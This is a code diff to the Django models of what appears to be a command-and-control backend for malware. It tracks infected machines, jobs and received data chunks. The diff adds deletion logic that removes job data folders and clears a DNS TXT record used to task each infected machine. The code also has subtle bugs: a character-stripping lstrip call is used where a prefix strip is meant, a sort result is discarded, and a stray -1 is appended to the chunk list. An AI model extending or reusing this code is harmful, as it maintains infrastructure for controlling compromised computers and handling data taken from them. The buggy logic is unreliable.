@@ -1,6 +1,7 @@
 from __future__ import annotations
 
 import os
+import shutil
 
 from decouple import config
 from django.db import models
@@ -19,6 +20,11 @@ class InfectedMachine(models.Model):
 
     def finished_jobs_count(self) -> int:
         return self.job_set.filter(finished_at__isnull=False).count()
+
+    def delete(self, *args, **kwargs):
+        for job in self.job_set.all():
+            job.delete()
+        super().delete(*args, **kwargs)
 
 class Job(models.Model):
     created_at = models.DateTimeField(auto_now_add=True)
@@ -46,6 +52,7 @@ class Job(models.Model):
         if not os.path.exists(self.extracted_file_path()):
             return "No chunks yet"
         chunks = [int(f.lstrip("chunk-")) for f in os.listdir(self.data_folder_path()) if f.startswith('chunk-')]
+        chunks.append(-1)
         sorted(chunks)
 
         missing = []
@@ -57,6 +64,16 @@ class Job(models.Model):
 
     def first_job_end_queue_set(self) -> JobEndQueue|None:
         return self.jobendqueue_set.first()
+
+    def delete(self, *args, **kwargs):
+        shutil.rmtree(self.data_folder_path(), ignore_errors=True)
+
+        current_machine_job = self.infected_machine.get_current_job()
+        if current_machine_job is not None and current_machine_job.id == self.id:
+            from djangoproject.services.DnsService import DnsService
+            DnsService().remove_job_txt(self.infected_machine)
+
+        super().delete(*args, **kwargs)
 
 class JobEndQueue(models.Model):
     created_at = models.DateTimeField(auto_now_add=True)
